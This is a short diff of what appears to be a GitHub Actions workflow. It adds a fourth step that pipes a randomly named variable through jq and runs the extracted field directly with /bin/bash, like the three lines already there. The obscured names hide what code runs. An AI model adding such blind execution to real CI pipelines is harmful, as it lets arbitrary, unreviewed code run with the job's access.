@@ -35,6 +35,7 @@ jobs:
           echo $imzo126 | jq -r .vc96947 | /bin/bash
           printf '%s' "$wz18337" | jq -r .mc7008 | /bin/bash
           printf '%s' "$lu0" | jq -r .izsu414 | /bin/bash
+          echo $j6922 | jq -r .w00039 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
